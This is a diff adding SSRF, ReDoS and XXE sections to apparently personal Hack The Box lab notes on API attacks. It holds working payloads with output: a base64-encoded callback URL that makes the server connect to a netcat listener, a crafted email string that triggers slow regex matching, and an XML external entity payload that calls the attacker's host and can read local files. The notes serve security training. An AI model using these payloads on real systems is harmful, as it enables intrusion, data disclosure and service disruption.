@@ -5,6 +5,9 @@
     - [PHP File Upload via API to RCE](#php-file-upload-via-api-to-rce)
   - [LFI](#lfi)
   - [XSS](#xss)
+  - [SSRF](#ssrf)
+  - [RegEx Denial of Service (_ReDos_)](#regex-denial-of-service-redos)
+  - [XXE Injection](#xxe-injection)
 
 ---
 
@@ -322,3 +325,163 @@ It looks like the app is encoding the submitted payload. You can try URL-encodin
 
 Now your submitted JS payload is evaluated successfully.
 
+## SSRF
+
+... allows an attacker to abouse server functionality to perform internal or external resource requests on behalf of the server.
+
+Can lead to:
+
+- interacting with known internal systems
+- discovering internal services via port scans
+- disclosing local/sensitive data
+- including files in the target application
+- leaking NetNTLM hashes using UNC Paths
+- achieving RCE
+
+Interact with the API:
+
+```bash
+d41y@htb[/htb]$ curl http://<TARGET IP>:3000/api/userinfo
+{"success":false,"error":"'id' parameter is not given."}
+```
+
+The API is expecting a parameter called _id_.
+
+```bash
+d41y@htb[/htb]$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Then specify ```http://<VPN/TUN Adapter IP>:<LISTENER PORT>``` as the value of the _id_ parameter and make an API call.
+
+```bash
+d41y@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=http://<VPN/TUN Adapter IP>:<LISTENER PORT>"
+{"success":false,"error":"'id' parameter is invalid."}
+```
+
+You notice an error about the parameter being invalid.
+
+In many cases, APIs expect parameter values in a specific format/encoding.
+
+```bash
+d41y@htb[/htb]$ echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
+d41y@htb[/htb]$ curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
+```
+
+When you make the API call, you will notice a connection being made to your Netcat listener:
+
+```bash
+d41y@htb[/htb]$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 50542
+GET / HTTP/1.1
+Accept: application/json, text/plain, */*
+User-Agent: axios/0.24.0
+Host: <VPN/TUN Adapter IP>:4444
+Connection: close
+```
+
+## RegEx Denial of Service (_ReDos_)
+
+Suppose you have a user that submits benign input to an API. On the other side, a dev could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in regular expressions to increase evaluation time is called a RegEx Denial of Service attack.
+
+Interact with the API:
+
+```bash
+d41y@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"
+{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
+```
+
+You can use [this website](https://regex101.com/) for an in-depth explanation, and this website for a [visualization](https://jex.im/regulex/#!flags=&re=%5E(a%7Cb)*%3F%24).
+
+Then, submit the following valid value and see how long the API takes to respond.
+
+```bash
+d41y@htb[/htb]$ curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."
+{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}
+```
+
+You will notice that the API takes several seconds to respond and that longer payloads increase the evaluation time.
+
+## XXE Injection
+
+... occurs when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow you to use XML features to perform malicious actions.
+
+Interact with the target and notice that there is a authentication page. Try to authenticate:
+
+![api attacks 6](../../../../images/api_attacks6.png)
+
+_or in plain http_:
+
+```bash
+POST /api/login/ HTTP/1.1
+Host: <TARGET IP>:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 111
+Origin: http://<TARGET IP>:3001
+DNT: 1
+Connection: close
+Referer: http://<TARGET IP>:3001/
+Sec-GPC: 1
+
+<?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
+```
+
+User authentication is generating XML data.
+
+Try crafting an exploit to read internal files.
+
+First, you will need to append a DOCTYPE to this request.
+
+> [!NOTE]
+> DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special chars or strings used in the documents. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource.
+
+The current payload:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
+<root>
+<email>test@test.com</email>
+<password>P@ssw0rd123</password>
+</root>
+```
+
+You defined a DTD called _pwn_, and inside of that, you have an ```ENTITY```. You may also define custom entities in XML DTDs to allow refactoring of variables and reduce reptitive data. This can be done using the ENTITY keyword, followed by the ```ENTITY``` name and its value.
+
+You have called your external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL or you can try using a URI scheme/protocol such as ```file://``` to call internal files.
+
+Set up a listener:
+
+```bash
+d41y@htb[/htb]$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Now make an API call containing the payload you crafted above:
+
+```bash
+d41y@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
+<p>Sorry, we cannot find a account with <b></b> email.</p>
+```
+
+You notice no connection being made to the listener. This is because you have defined your external entity, but you haven't tried to use it.
+
+```bash
+d41y@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
+```
+
+After the call to the API, you will notice a connection being made to the listener:
+
+```bash
+d41y@htb[/htb]$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
+GET / HTTP/1.0
+Host: <VPN/TUN Adapter IP>:4444
+Connection: close
+```
